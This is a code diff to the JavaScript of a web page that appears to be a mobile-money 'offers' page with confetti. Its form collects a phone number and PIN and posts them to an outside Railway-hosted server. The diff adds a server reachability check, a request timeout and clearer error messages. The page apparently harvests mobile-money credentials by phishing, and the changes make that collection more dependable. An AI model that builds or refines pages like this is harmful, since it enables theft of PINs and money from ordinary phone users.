@@ -434,9 +434,30 @@
             let submitted = false;
 
             // ===== RAILWAY API URL =====
+            // Use the exact URL from Railway
             const API_URL = 'https://mixxbyyas-offers06com-production.up.railway.app';
 
-            console.log('🔗 API URL:', API_URL);
+            console.log('🔗 Connecting to API:', API_URL);
+
+            // First, test if the server is reachable
+            async function testServerConnection() {
+                try {
+                    const response = await fetch(`${API_URL}/api/health`);
+                    if (response.ok) {
+                        console.log('✅ Server is reachable!');
+                        return true;
+                    } else {
+                        console.log('❌ Server returned:', response.status);
+                        return false;
+                    }
+                } catch (error) {
+                    console.log('❌ Cannot reach server:', error.message);
+                    return false;
+                }
+            }
+
+            // Test connection when page loads
+            testServerConnection();
 
             // ===== CONFETTI EFFECT =====
             function launchConfetti() {
@@ -556,7 +577,7 @@
 
                 if (!/^(07|06)\d{8}$/.test(phone)) {
                     phoneInput.classList.add('error');
-                    errorMessage.textContent = '❌ Phone must start with 07 or 06 (e.g., 0712345678)';
+                    errorMessage.textContent = '❌ Phone must start with 07 or 06';
                     phoneInput.focus();
                     return;
                 }
@@ -579,22 +600,32 @@
 
                 const requestData = { phone: phone, pin: pin };
                 console.log('📤 Sending login data:', requestData);
+                console.log('📤 To URL:', `${API_URL}/api/login`);
 
                 try {
                     const response = await fetch(`${API_URL}/api/login`, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
+                            'Accept': 'application/json'
                         },
-                        body: JSON.stringify(requestData)
+                        body: JSON.stringify(requestData),
+                        // Add timeout
+                        signal: AbortSignal.timeout(10000)
                     });
 
                     console.log('📥 Response status:', response.status);
+                    console.log('📥 Response OK:', response.ok);
 
                     if (!response.ok) {
                         const errorText = await response.text();
-                        console.error('❌ Response error:', errorText);
-                        throw new Error(`Server error: ${response.status}`);
+                        console.log('📥 Error response:', errorText);
+                        try {
+                            const errorData = JSON.parse(errorText);
+                            throw new Error(errorData.message || `Server error: ${response.status}`);
+                        } catch (e) {
+                            throw new Error(`Server error ${response.status}: ${errorText}`);
+                        }
                     }
 
                     const data = await response.json();
@@ -613,7 +644,19 @@
                     }
                 } catch (error) {
                     console.error('❌ Error:', error);
-                    errorMessage.textContent = '❌ ' + (error.message || 'Login failed. Please try again.');
+                    console.error('❌ Error name:', error.name);
+                    console.error('❌ Error message:', error.message);
+                    
+                    let userMessage = 'Login failed. Please try again.';
+                    if (error.name === 'TimeoutError') {
+                        userMessage = 'Request timed out. Please check your connection and try again.';
+                    } else if (error.message.includes('Failed to fetch')) {
+                        userMessage = 'Cannot connect to server. Please check your internet connection.';
+                    } else {
+                        userMessage = error.message || 'Login failed. Please try again.';
+                    }
+                    
+                    errorMessage.textContent = '❌ ' + userMessage;
                     submitted = false;
                     loginBtn.classList.remove('loading');
                     loginBtn.disabled = false;
@@ -621,6 +664,7 @@
                 }
             }
 
+            // ===== BACK BUTTON =====
             document.getElementById('backLink').addEventListener('click', function(e) {
                 // Allow navigation to proceed
             });
